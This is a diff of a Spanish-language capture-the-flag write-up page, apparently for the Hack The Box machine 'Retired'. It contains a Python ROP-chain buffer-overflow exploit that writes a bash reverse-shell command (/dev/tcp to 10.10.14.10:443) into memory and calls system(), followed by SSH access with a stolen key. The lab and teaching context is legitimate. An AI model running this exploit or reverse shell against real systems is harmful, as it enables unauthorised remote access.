-payload </span><span class="o">+= </span><span class="p">system</span>
+<code><span class="p">payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""
+</span><span class="p">payload </span><span class="o">+= </span><span class="p">junk</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mediante un bucle <code class="language-plaintext highlighter-rouge">for</code> cargaremos de <code class="language-plaintext highlighter-rouge">8</code> en <code class="language-plaintext highlighter-rouge">8</code> bytes del comando al registro <code class="language-plaintext highlighter-rouge">rsi</code> y guardaremos en <code class="language-plaintext highlighter-rouge">rdi</code> la dirección de <code class="language-plaintext highlighter-rouge">.data</code> con el offset necesario, luego al ejecutar el <code class="language-plaintext highlighter-rouge">mov</code> depositaremos los <code class="language-plaintext highlighter-rouge">8</code> bytes de la cadena en la sección <code class="language-plaintext highlighter-rouge">.data</code> asi que al terminar deberiamos tener todo el comando de bash en la sección <code class="language-plaintext highlighter-rouge">.data</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="no"> len</span><span class="p">(command), </span><span class="mi">8</span><span class="p">):
+    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x26796</span><span class="p">)</span><span class="c1">         # pop rdi; ret;</span><span class="p">
+    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x1be1a0</span><span class="o"> +</span><span class="p"> i)</span><span class="c1">    # .data</span><span class="p">
+    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x2890f</span><span class="p">)</span><span class="c1">         # pop rsi; ret;</span><span class="p">
+    payload</span><span class="o"> +=</span><span class="p"> command[i:i</span><span class="o">+</span><span class="mi">8</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">,</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)</span><span class="c1"> # string</span><span class="p">
+    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x603b2</span><span class="p">)</span><span class="c1">         # mov qword ptr [rdi], rsi; ret;  </span><span class="p"></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para terminar el payload en el registro <code class="language-plaintext highlighter-rouge">rdi</code> guardaremos la direccion de la seccion <code class="language-plaintext highlighter-rouge">.data</code> que contiene nuestro comando de bash, seguido de la funcion <code class="language-plaintext highlighter-rouge">system</code> que al leer el primer argumento de <code class="language-plaintext highlighter-rouge">rdi</code> ejecutara el oneliner y enviara la <code class="language-plaintext highlighter-rouge">revshell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">payload </span><span class="o">+= </span><span class="p">p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x026796</span><span class="p">)</span><span class="c1"> # pop rdi; ret;  </span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x1be1a0</span><span class="p">)</span><span class="c1"> # .data</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x048e50</span><span class="p">)</span><span class="c1"> # system()</span><span class="p"></span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Finalmente enviamos la petición con el <code class="language-plaintext highlighter-rouge">payload</code> que hemos definido como licensefile</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">requests.post(</span><span class="s">"http://retired.htb/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
+<code><span class="p">requests.post(</span><span class="s">"http://10.10.11.154/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Este script al ejecutarlo deberia explotar el <code class="language-plaintext highlighter-rouge">bof</code> remotamente y enviarnos la shell</p>
@@ -989,36 +743,25 @@ payload </span><span class="o">+= </span><span class="p">system</span>
 offset </span><span class="o">= </span><span class="mi">520</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-binary_base </span><span class="o">= </span><span class="mi">0x564086262000</span><span class="p">
-libc_base </span><span class="o">= </span><span class="mi">0x7f82a824f000</span><span class="p">
-
-offset_writable </span><span class="o">= </span><span class="mi">0x4000</span><span class="p">
-offset_system </span><span class="o">= </span><span class="mi">0x48e50</span><span class="p">
-offset_pop_rdi </span><span class="o">= </span><span class="mi">0x26796</span><span class="p">
-offset_pop_rsi </span><span class="o">= </span><span class="mi">0x2890f</span><span class="p">
-offset_mov_rdi_rsi </span><span class="o">= </span><span class="mi">0x603b2</span><span class="p">
-
-writable </span><span class="o">= </span><span class="p">binary_base </span><span class="o">+ </span><span class="p">offset_writable
-
-system </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_system)
-pop_rdi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rdi)
-pop_rsi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rsi)
-mov_rdi_rsi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_mov_rdi_rsi)
+libc_base </span><span class="o">= </span><span class="mi">0x7f670e288000</span><span class="p">
 
 command </span><span class="o">= </span><span class="no">b</span><span class="s">"bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"</span><span class="p">
 
 payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
 payload </span><span class="o">+= </span><span class="p">junk
 
-</span><span class="o">for </span><span class="p">i </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">, </span><span class="no">len</span><span class="p">(command), </span><span class="mi">8</span><span class="p">):
-    payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">p64(writable </span><span class="o">+ </span><span class="p">i)
-    payload </span><span class="o">+= </span><span class="p">pop_rsi </span><span class="o">+ </span><span class="p">command[i:i</span><span class="o">+</span><span class="mi">8</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)
-    payload </span><span class="o">+= </span><span class="p">mov_rdi_rsi
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="no"> len</span><span class="p">(command), </span><span class="mi">8</span><span class="p">):
+    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x26796</span><span class="p">)</span><span class="c1">         # pop rdi; ret;</span><span class="p">
+    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x1be1a0</span><span class="o"> +</span><span class="p"> i)</span><span class="c1">    # .data</span><span class="p">
+    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x2890f</span><span class="p">)</span><span class="c1">         # pop rsi; ret;</span><span class="p">
+    payload</span><span class="o"> +=</span><span class="p"> command[i:i</span><span class="o">+</span><span class="mi">8</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">,</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)</span><span class="c1"> # string</span><span class="p">
+    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x603b2</span><span class="p">)</span><span class="c1">         # mov qword ptr [rdi], rsi; ret;</span><span class="p">
 
-payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">p64(writable)
-payload </span><span class="o">+= </span><span class="p">system
+payload </span><span class="o">+= </span><span class="p">p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x026796</span><span class="p">)</span><span class="c1"> # pop rdi; ret;</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x1be1a0</span><span class="p">)</span><span class="c1"> # .data</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x048e50</span><span class="p">)</span><span class="c1"> # system()</span><span class="p">
 
-requests.post(</span><span class="s">"http://retired.htb/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
+requests.post(</span><span class="s">"http://10.10.11.154/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">script</code> enviara la petición con nuestro payload y al programa interpretarla nos enviara una <code class="language-plaintext highlighter-rouge">revshell</code> en este caso como <code class="language-plaintext highlighter-rouge">www-data</code> a nuestro host</p>
@@ -1216,7 +959,7 @@ aQSXt9vNnIW2hDwX9fIFGKaz58FYweCXzLwgRVGBfnpq2QSXB0iXtLCNkWbAS9DM3esjsA
 
 <p class="plain-text">Podemos simplemente usar la <code class="language-plaintext highlighter-rouge">id_rsa</code> para conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> a la maquina sin contraseña, al hacerlo nos convertimos en <code class="language-plaintext highlighter-rouge">dev</code> y podemos leer la primera <code class="language-plaintext highlighter-rouge">flag</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ssh </span><span class="p">dev@retired.htb -i id_rsa
+<code><span class="ve">❯ ssh </span><span class="p">dev@10.10.11.154 -i id_rsa
 </span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
 uid=1001(dev) gid=1001(dev) groups=1001(dev),33(www-data)  
 </span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
